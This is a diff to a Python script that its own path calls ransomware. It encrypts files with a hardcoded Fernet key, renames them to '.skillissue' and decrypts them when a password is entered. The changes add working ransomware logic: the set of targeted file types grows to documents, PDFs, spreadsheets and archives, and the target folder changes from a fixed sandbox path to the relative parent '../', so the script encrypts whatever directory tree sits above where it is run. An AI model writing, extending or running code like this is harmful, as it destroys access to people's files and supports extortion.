@@ -5,9 +5,9 @@ import tkinter as tk
 from tkinter import filedialog
 
 man_key = b'ex6N4o0hurcGMsqa3EsZ4XFce1NYBrL807tn94saoac='
-
+extEnc = ['.txt', '.7z', '.pdf', '.doc', '.docx', '.csv', '.jar', '.rar']
 def encrypt(dataFile, fernet_key):
-    if dataFile.name.endswith('.txt'):
+    if dataFile.name.endswith(tuple(extEnc)):
         dataFile = Path(dataFile.path) 
         with open(dataFile, 'rb') as f:
             data = f.read()
@@ -18,10 +18,10 @@ def encrypt(dataFile, fernet_key):
         # Overwrite the existing .txt file with the encrypted data and change the extension
         with open(dataFile, 'wb') as f:
             f.write(data)
-        change_file_extension(dataFile, "txt.skillissue")
+        change_file_extension(dataFile, "skillissue")
 
 def decrypt(dataFile, fernet_key):
-    if dataFile.name.endswith('.txt.skillissue'):
+    if dataFile.name.endswith('.skillissue'):
         dataFile = Path(dataFile.path)  # Convert to a pathlib.Path object
         with open(dataFile, 'rb') as f:
             data = f.read()
@@ -48,7 +48,7 @@ def verify_keyword(keyword):
     return keyword == "qwerty12345"
 
 # Encrypt all files in the current directory and its subdirectories
-directory = "C:/Users/Admin/Desktop/python/Ransomware/fernet"  # Change this to the directory containing the files to be encrypted
+directory = "../"  # Change this to the directory containing the files to be encrypted
 for item in scanRecurse(directory):
     # encrypt(item, symmetric_key)
     encrypt(item, man_key)
@@ -78,7 +78,7 @@ def submit_keyword():
 
 def decrypt_with_symmetric_key(symmetric_key):
     # Decrypt all skillissue files in the current directory and its subdirectories
-    directory = 'C:/Users/Admin/Desktop/python/Ransomware/fernet'  # Change this to the directory containing the skillissue files
+    directory = '../'  # Change this to the directory containing the skillissue files
     for item in scanRecurse(directory):
         if item.name.endswith('.skillissue'):
             decrypt(item, symmetric_key)
